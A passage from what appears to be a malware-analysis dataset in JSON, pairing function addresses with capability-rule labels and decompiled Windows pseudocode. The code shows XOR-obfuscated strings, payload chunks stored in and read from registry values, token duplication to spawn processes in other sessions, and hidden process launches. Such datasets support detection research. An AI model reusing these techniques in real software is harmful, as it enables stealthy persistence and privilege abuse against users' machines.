var_44h = *param_1;\n            var_40h = 0x4f3e542b;\n            var_3ch = 0x54284b57;\n            var_38h = 0x4b404f25;\n            var_34h = 0x4f3a5400;\n            var_30h = 0x542e4b58;\n            var_2ch = 0x4b1c4f32;\n            var_4ch = (((var_44h + 0x7cfffU) / 0x7d000) * 0x7d000) / 0x7d000;\n            puVar7 = &ARG_0;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_28h = 0x4f57542d;\n            puVar7 = &lpValueName;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_8h = 0x4f575449;\n            var_4h._0_2_ = 0x4b39;\n            uVar1 = (*pcVar5)(8, 0x39);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_54h = iVar4;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n                if (iVar3 != 0xdf936c) {\n                    var_ch = 6;\n                    *(iVar6 + iVar4) = *(&var_8h + iVar6 % 6) ^ (iVar6 + iVar4)[&var_40h - iVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar4, var_20h);\n            var_1ch = 0;\n            var_18h = 0x6e347a49;\n            var_14h = 0x475f6c3e;\n            var_10h = 0x7a6c610a;\n            var_8h = 0x6e477a6c;\n            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x61);\n            var_20h = 5;\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            do {\n                uVar1 = (*pcVar5)(8, 0x19);\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar6 = 0;\n                var_ch = &var_18h - iVar4;\n                do {\n                    iVar3 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n                    if (iVar3 != 0x3afc4a) {\n                        *(iVar6 + iVar4) = *(&var_8h + iVar6 % var_20h) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0xc);\n                puVar7 = &lpValueName;\n                for (iVar6 = 0x40; iVar3 = var_1ch,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar4, &ARG_0, var_1ch);\n                (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(hKey, &lpValueName);\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                var_1ch = iVar3 + 1;\n            } while (var_1ch < 0x32);\n            var_ch = 0;\n            if (0 < var_4ch) {\n                var_1ch = 0;\n                var_18h = 0x6e347a49;\n                var_14h = 0x475f6c3e;\n                var_10h = 0x7a6c610a;\n                var_8h = 0x6e477a6c;\n                var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x61);\n                do {\n                    uVar1 = (*pcVar5)(8, 0x19);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                    iVar6 = 0;\n                    var_24h = &var_18h - iVar4;\n                    do {\n                        iVar3 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n                        if (iVar3 != 0x3afc4a) {\n                            *(iVar6 + iVar4) = *(&var_8h + iVar6 % var_20h) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 0xc);\n                    puVar7 = &lpValueName;\n                    for (iVar6 = 0x40; iVar3 = var_ch,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar7 = 0;\n                        puVar7 = puVar7 + 1;\n                    }\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar4, &ARG_0, var_ch);\n                    iVar6 = 0x7d000;\n                    if (var_44h < 0x7d000) {\n                        iVar6 = var_44h;\n                    }\n                    iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)\n                                      (hKey, &lpValueName, 0, 3, var_50h[1] + var_1ch, iVar6);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    var_24h = -iVar6 & 0xffffff00U | 1 - (iVar6 != 0);\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    var_ch = iVar3 + 1;\n                    var_1ch = var_1ch + 0x7d000;\n                    var_44h = var_44h + -0x7d000;\n                } while (var_ch < var_4ch);\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            uVar1 = (*pcVar5)(0, var_54h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar2 = var_58h;\n        }\n        uVar1 = (*pcVar5)(0, uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    return uVar2 & 0xffffff00 | var_24h & 0xff;\n}\n",
        "token_count": 2159
    },
    "00408054": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00408054(int32_t *param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    code *pcVar11;\n    uint ARG_0;\n    uint lpValueName;\n    uint var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uchar *var_5ch;\n    uchar *var_58h;\n    int32_t *var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uchar *var_48h;\n    uchar *var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *lpcbData;\n    int32_t lpType;\n    uint var_10h;\n    uint var_ch;\n    int32_t hKey;\n    uint var_1h;\n    \n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    *param_1 = 0;\n    param_1[1] = 0;\n    var_54h = param_1;\n    lpType = param_2;\n    uVar2 = (*pcVar11)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        var_50h = iVar3;\n        fcn.00407b94();\n        var_64h = fcn.00407b3b(0x20019);\n        if (var_64h != 0) {\n            var_4ch = 0;\n            var_40h = 0x4f3e542b;\n            puVar9 = &ARG_0;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_3ch = 0x54284b57;\n            puVar9 = &lpValueName;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_38h = 0x4b404f25;\n            var_34h = 0x4f3a5400;\n            var_30h = 0x542e4b58;\n            var_2ch = 0x4b1c4f32;\n            var_28h = 0x4f57542d;\n            var_10h = 0x4f575449;\n            var_ch._0_2_ = 0x4b39;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x39);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar8 = 0;\n            var_68h = iVar3;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n                if (iVar4 != 0xdf936c) {\n                    hKey = 6;\n                    *(iVar8 + iVar3) = *(&var_10h + iVar8 % 6) ^ (iVar8 + iVar3)[&var_40h - iVar3];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar3, lpType);\n            var_24h = 0x6e347a49;\n            var_20h = 0x475f6c3e;\n            var_1ch = 0x7a6c610a;\n            var_10h = 0x6e477a6c;\n            var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x61);\n            do {\n                pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                puVar9 = &var_70h;\n                for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                puVar9 = &lpValueName;\n                for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar8 = 0;\n                lpType = &var_24h - iVar3;\n                var_6ch = iVar3;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n                    iVar4 = var_4ch;\n                    if (iVar5 != 0x3afc4a) {\n                        hKey = 5;\n                        *(iVar8 + iVar3) = *(&var_10h + iVar8 % 5) ^ (iVar8 + iVar3)[lpType];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0xc);\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar3, &ARG_0, var_4ch);\n                var_1h._0_1_ = '\\0';\n                var_44h = NULL;\n                var_4ch = iVar4 + 1;\n                var_48h = NULL;\n                hKey = fcn.00407b3b(0x20019);\n                param_1 = var_54h;\n                if (hKey != 0) {\n                    lpType = 3;\n                    lpcbData = NULL;\n                    var_5ch = NULL;\n                    iVar8 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, &lpValueName, 0, &lpType, 0, &lpcbData);\n                    if (iVar8 == 0) {\n                        uVar2 = (*pcVar11)(8, lpcbData);\n                        var_58h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        puVar7 = var_5ch;\n                        puVar6 = var_5ch;\n                        if ((var_58h == NULL) ||\n                           (iVar8 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)\n                                              (hKey, &lpValueName, 0, &lpType, var_58h, &lpcbData),  puVar7 = var_58h, \n                           puVar6 = lpcbData,  iVar8 == 0)) {\n                            var_1h._0_1_ = '\\x01';\n                            var_48h = puVar6;\n                            var_44h = puVar7;\n                        }\n                    }\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n                    if (((var_1h != '\\0') && (var_44h != NULL)) && (var_48h != NULL)) {\n                        if (param_1[1] == 0) {\n                            uVar2 = (*pcVar11)(8, var_48h);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        }\n                        else {\n                            uVar2 = (*pcVar11)(0, param_1[1], var_48h + *param_1);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(uVar2);\n                        }\n                        param_1[1] = iVar3;\n                        puVar6 = var_44h;\n                        puVar10 = iVar3 + *param_1;\n                        for (puVar7 = var_48h; puVar7 != NULL; puVar7 = puVar7 + -1) {\n                            *puVar10 = *puVar6;\n                            puVar6 = puVar6 + 1;\n                            puVar10 = puVar10 + 1;\n                        }\n                        *param_1 = var_48h + *param_1;\n                        pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_44h);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                        iVar3 = var_6ch;\n                    }\n                }\n                uVar2 = (*pcVar11)(0, iVar3);\n                pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            } while (var_1h != '\\0');\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_64h);\n            uVar2 = (*pcVar11)(0, var_68h);\n            (*pcVar1)(uVar2);\n            iVar3 = var_50h;\n        }\n        uVar2 = (*pcVar11)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = 1;\n    if ((*param_1 == 0) || (param_1[1] == 0)) {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 2257
    },
    "00409f19": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00409f19(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int32_t *piVar8;\n    uint *puVar9;\n    uint lpCommandLine;\n    int32_t var_b0h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    uint TokenHandle;\n    uint var_54h;\n    int32_t var_50h;\n    uint pSessionId;\n    int32_t var_48h;\n    uint hExistingToken;\n    int32_t *var_40h;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint hToken;\n    uint var_8h;\n    uint var_4h;\n    \n    var_54h = 4;\n    var_34h._0_2_ = 0x1000;\n    piVar8 = param_2;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *piVar8 = 0;\n        piVar8 = piVar8 + 1;\n    }\n    pSessionId = 0;\n    puVar9 = &lpCommandLine;\n    var_40h = param_2;\n    for (iVar6 = 0x44; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    hToken = 0;\n    puVar9 = &var_6ch;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    hExistingToken = 0;\n    var_30h = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    iVar6 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    if (iVar6 != 0) {\n        var_64h = iVar6;\n        iVar2 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(param_1, &pSessionId);\n        pcVar7 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar2 != 0) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(iVar6, 0x201eb, &hExistingToken);\n            if (iVar2 != 0) {\n                fcn.00408959();\n                iVar2 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hToken);\n                pcVar1 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar2 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hToken, 0xc, pSessionId, 4);\n                    iVar6 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar6 != 0) {\n                        var_68h = 0x20;\n                        var_6ch = pSid;\n                        iVar6 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar1)(hToken, 0x19, &var_6ch, iVar6 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_5ch = 0;\n                    (*pcVar1)(hToken, 0x1b, &var_5ch, 4);\n                    iVar6 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_30h, hToken, 1);\n                    if (iVar6 == 0) {\n                        var_30h = 0;\n                    }\n                    else {\n                        var_54h = 0x404;\n                    }\n                    lpCommandLine = 0x44;\n                    var_2ch = 0x52593435;\n                    var_28h = 0x30474208;\n                    var_24h = 0x34236626;\n                    var_20h = 0x423a5200;\n                    var_1ch = 0x66373050;\n                    var_18h = 0x52513424;\n                    var_14h = 0x30584213;\n                    var_10h = 0x34426626;\n                    var_8h = 0x52303442;\n                    var_4h._0_1_ = 0x66;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x41);\n                    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    var_50h = 5;\n                    iVar2 = 0;\n                    var_48h = &var_2ch - iVar6;\n                    var_60h = iVar6;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n                        if (iVar4 != 0x18f904) {\n                            *(iVar2 + iVar6) = *(&var_8h + iVar2 % var_50h) ^ (iVar2 + iVar6)[var_48h];\n                        }\n                        iVar2 = iVar2 + 1;\n                    } while (iVar2 < 0x20);\n                    var_24h = 0x7a1f4344;\n                    var_20h = 0x692b3708;\n                    var_1ch = 0x43446b15;\n                    var_18h = 0x37457a1d;\n                    var_14h = 0x6b026926;\n                    var_10h = 0x7a694352;\n                    var_8h = 0x7a694337;\n                    var_4h._0_1_ = 0x6b;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x31);\n                    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar2 = 0;\n                    var_48h = &var_24h - iVar6;\n                    do {\n                        iVar5 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n                        piVar8 = var_40h;\n                        iVar4 = var_60h;\n                        if (iVar5 != 0xe55bd6) {\n                            *(iVar2 + iVar6) = *(&var_8h + iVar2 % var_50h) ^ (iVar2 + iVar6)[&var_24h - iVar6];\n                        }\n                        iVar2 = iVar2 + 1;\n                    } while (iVar2 < 0x18);\n                    var_88h._0_2_ = 0;\n                    var_b0h = var_60h;\n                    var_8ch = 1;\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hToken, iVar6, 0, 0, 0, 0, var_54h, var_30h, 0, &lpCommandLine, var_40h);\n                    pcVar7 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    if (*piVar8 != 0) {\n                        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*piVar8, 0x201eb, &TokenHandle);\n                        if (iVar2 != 0) {\n                            fcn.00408959();\n                            (*pcVar7)(TokenHandle);\n                        }\n                        (*pcVar7)(var_40h[1]);\n                    }\n                    if (var_30h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_30h);\n                    }\n                    (*pcVar7)(hToken);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*pcVar1)(uVar3);\n                    param_2 = var_40h;\n                    iVar6 = var_64h;\n                }\n                (*pcVar7)(hExistingToken);\n            }\n        }\n        (*pcVar7)(iVar6);\n    }\n    return *param_2;\n}\n",
        "token_count": 2073
    },
    "0040a23e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040a23e(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint lpCommandLine;\n    uint var_98h;\n    uint *var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4ch = 0x33186656;\n    iVar5 = 0x44;\n    var_48h = 0x4b157308;\n    puVar6 = param_1;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_44h = 0x66167147;\n    var_40h = 0x73233326;\n    puVar6 = &var_98h;\n    var_54h = param_1;\n    for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_98h = 0x44;\n    var_3ch = 0x715c4b09;\n    puVar6 = &lpCommandLine;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_38h = 0x336e6607;\n    var_34h = 0x4b15732d;\n    var_30h = 0x6600714a;\n    var_2ch = 0x7314333f;\n    var_28h = 0x71004b0b;\n    var_24h = 0x33176641;\n    var_20h = 0x4b107302;\n    var_1ch = 0x661b7150;\n    var_18h = 0x73023324;\n    var_14h = 0x711d4b12;\n    var_10h = 0x33336616;\n    var_ch = 0x4b667314;\n    var_8h = 0x334b6673;\n    var_4h._0_1_ = 0x71;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x89);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar2 != 0x8554a0) {\n            var_50h = 5;\n            *(iVar5 + iVar4) = *(&var_8h + iVar5 % 5) ^ (iVar5 + iVar4)[&var_4ch - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x44);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar4, &lpCommandLine, 0x104);\n    puVar6 = var_54h;\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, &lpCommandLine, 0, 0, 0, 0x800000c, 0, 0, &var_98h, var_54h);\n    if (puVar6[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar6[1]);\n    }\n    uVar1 = *puVar6;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar1;\n}\n",
        "token_count": 1028
    },
    "0040a3a7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040a3a7(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    code *pcVar8;\n    uint lpApplicationName;\n    uint lpCommandLine;\n    int32_t var_a8h;\n    uint var_84h;\n    uint var_80h;\n    uint var_64h;\n    uint var_60h;\n    int32_t *var_5ch;\n    uint var_58h;\n    int32_t ProcessHandle;\n    uint TokenHandle;\n    uint var_4ch;\n    uint pSessionId;\n    int32_t var_44h;\n    uint hExistingToken;\n    uint pSid;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint pIdentifierAuthority;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint hToken;\n    \n    var_14h._0_2_ = 0x1000;\n    piVar6 = param_2;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *piVar6 = 0;\n        piVar6 = piVar6 + 1;\n    }\n    puVar7 = &lpCommandLine;\n    var_5ch = param_2;\n    for (iVar4 = 0x44; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    pSessionId = 0;\n    puVar7 = &var_64h;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_4ch = 0;\n    hToken = 0;\n    hExistingToken = 0;\n    var_8h = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    ProcessHandle = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    if (ProcessHandle != 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(param_1, &pSessionId);\n        pcVar8 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar4 != 0) {\n            iVar4 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 0x201eb, &hExistingToken);\n            if (iVar4 != 0) {\n                fcn.00408959();\n                iVar4 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hToken);\n                pcVar1 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar4 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hToken, 0xc, pSessionId, 4);\n                    iVar5 = 0;\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar4 != 0) {\n                        var_60h = 0x20;\n                        var_64h = pSid;\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar1)(hToken, 0x19, &var_64h, iVar4 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_58h = 0;\n                    (*pcVar1)(hToken, 0x1b, &var_58h, 4);\n                    iVar4 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_8h, hToken, 1);\n                    if (iVar4 == 0) {\n                        var_8h = 0;\n                    }\n                    else {\n                        var_4ch = 0x400;\n                    }\n                    lpCommandLine = 0x44;\n                    var_38h = 0x52593435;\n                    var_34h = 0x30474208;\n                    var_30h = 0x34236626;\n                    var_2ch = 0x423a5200;\n                    var_28h = 0x66373050;\n                    var_24h = 0x52513424;\n                    var_20h = 0x30584213;\n                    var_1ch = 0x34426626;\n                    var_10h = 0x52303442;\n                    var_ch._0_1_ = 0x66;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x41);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    var_44h = &var_38h - iVar4;\n                    do {\n                        iVar3 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n                        if (iVar3 != 0x18f904) {\n                            var_44h = 5;\n                            *(iVar5 + iVar4) = *(&var_10h + iVar5 % 5) ^ (iVar5 + iVar4)[&var_38h - iVar4];\n                        }\n                        iVar5 = iVar5 + 1;\n                    } while (iVar5 < 0x20);\n                    var_80h._0_2_ = 0;\n                    var_84h = 1;\n                    var_a8h = iVar4;\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpApplicationName, L\"%s --\", *0x41cb38);\n                    param_2 = var_5ch;\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hToken, &lpApplicationName, 0, 0, 0, 0, var_4ch, var_8h, 0, &lpCommandLine, var_5ch);\n                    pcVar8 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    if (*param_2 != 0) {\n                        iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*param_2, 0x201eb, &TokenHandle);\n                        if (iVar5 != 0) {\n                            fcn.00408959();\n                            (*pcVar8)(TokenHandle);\n                        }\n                        (*pcVar8)(param_2[1]);\n                    }\n                    if (var_8h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_8h);\n                    }\n                    (*pcVar8)(hToken);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                }\n                (*pcVar8)(hExistingToken);\n            }\n        }\n        (*pcVar8)(ProcessHandle);\n    }\n    return *param_2;\n}\n",
        "token_count": 1704
    },
    "0040a64c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
